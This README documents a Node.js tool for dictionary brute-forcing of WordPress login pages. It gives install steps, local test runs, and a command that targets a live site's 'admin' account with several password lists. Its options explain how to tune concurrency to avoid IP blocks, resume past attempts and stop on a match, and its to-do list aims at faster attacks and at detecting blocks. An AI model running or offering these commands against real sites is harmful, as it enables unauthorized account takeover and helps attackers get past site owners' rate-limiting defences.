#wplogin
Log in to Wordpress


###Install
```
npm install
```


###Test Eventual Success Locally
```
# Will succeed on the 500th request
# Start server locally...
node ./local.js 
# In new terminal...
node ./ -d ./dict.example -v -s5 -r -h 'localhost:3000/500'
```


###Test Eventual Block Locally
```
# Will block incoming requests after 300
# Start server locally...
node ./local.js 
# In new terminal...
node ./ -d ./dict.example -v -s5 -r -h 'localhost:3000/-300'
```


###Test Live Website Using Several Dictionaries in One Folder
```
node ./ -h 'http://www.example.com' -u admin -d ./~dicts -v -s5 -r
```


###Options
* -h [HOST]
	* The website's root domain
	* Required
	* Ex: -h 'http://www.example.com'
* -p [PATH]
	* Path to wp-login.php
	* Default: '/wp-login.php'
	* Ex: -p '/blog/wp-login.php'
* -u [USERNAME]
	* Username to test passwords against
	* Default: 'admin'
	* Ex: -u 'dave'
* -d [PATH]
	* Path to password list(s)
		* Can be a specific file or a directory
		* Dictionaries must be new-line delimited
	* Default: './dict.example'
	* Ex: -d ./~dicts
* -t [INTEGER]
	* Max concurrent curl threads. Lower this to avoid IP blocks. Raise it to increase speed.
		* May need to up your system's process limit. Ex: ulimit -S -n 2048
	* Default: 8
	* Ex: -t4
* -r
	* Quit on match found
	* Default: disabled; will continue testing until blocked or dictionary is spent
* -v
	* Verbose
	* Default: disabled
* -s [INTEGER]
	* Interval in seconds to output stats
	* Default: null (no output)
	* Ex: -s10
* -f
	* Try all passwords even if the result has been saved locally. You can also simply wipe your ./db folder.
	* Default: disabled; Results from previous script runs will be skipped.


###To Do
- Use hyperquest instead of curl. I've benchmarked vastly improved speed and resource allocation efficiency.
- Adaptive curl timing
- Stricter confirmation that we haven't been blocked and don't know it